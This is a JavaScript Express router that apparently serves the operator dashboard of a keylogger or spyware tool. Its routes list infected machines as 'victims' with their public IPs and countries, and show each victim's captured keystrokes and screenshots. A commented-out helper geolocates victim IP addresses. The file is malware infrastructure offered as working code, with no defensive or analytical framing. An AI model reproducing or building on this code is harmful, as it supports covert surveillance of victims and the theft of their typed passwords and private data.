'use strict'

const express = require('express')
const https = require('https')
const escapingFunctions = require('../middlewares/escaping')
const router = express.Router()
const clientService = require('../../services/clientService')
const keylogsService = require('../../services/keylogsService')
const screenshotService = require('../../services/screenshotService')
const ipAddressService = require('../../services/ipAddressService')

router.get('/', async (req, res, next) => {
    try {
        const clients = await clientService.getAll()
        const ip_addresses = new Array()
        
        for (let c in clients) {
            const ip = await ipAddressService.findLastPublicIPByClientId(clients[c].id)
            ip_addresses.push({
                clientId: clients[c].id,
                ipAddress: (ip == null ? '-' : ip.ipAddress),
                country: (ip == null ? '-' : ip.country)
            })
        }

        res.render('pages/victims', {clients: clients, ip_addresses: ip_addresses})
    } catch (e) { next(e) }
})

router.get('/:uuid', async (req, res, next) => {
    try {
        const single_client = await clientService.findOneByUuid(req.params.uuid)
        const keylogs = await keylogsService.findAllByClientId(single_client.id)
        const screenshots = await screenshotService.findAllByClientId(single_client.id)
        const ip = await ipAddressService.findLastPublicIPByClientId(single_client.id)
        /*
        const reqCountry = function(ipAddress) {
            return new Promise( (resolve, reject) => {
                let url = new URL('https://ip-api.io/json/' + ipAddress)
                let params = {
                    method: "GET",
                    headers: {
                        "Content-Type": "application/json0"
                    }
                }
                
                https.request(url, params, (resp) => {
                    let data = ''
                    
                    // A chunk of data has been received.
                    resp.on('data', (chunk) => {
                        data += chunk
                    })
                    // The whole response has been received. Print out the result.
                    resp.on('end', () => {
                        try {
                            data = JSON.parse(data)
                        } catch (e) {
                            reject(e)
                        }
                        resolve(data)
                    })
                }).on("error", (err) => {
                    console.log("Error: " + err.message)
                    reject(err)
                }).end()
            })
        }
        */

        res.render('pages/single_victim', 
        {
            single_client: single_client,
            keylogs: keylogs,
            screenshots: screenshots,
            ipAddress: (ip == null ? '' : ip.ipAddress)
        })
    } catch (e) { next(e) }
})

module.exports = router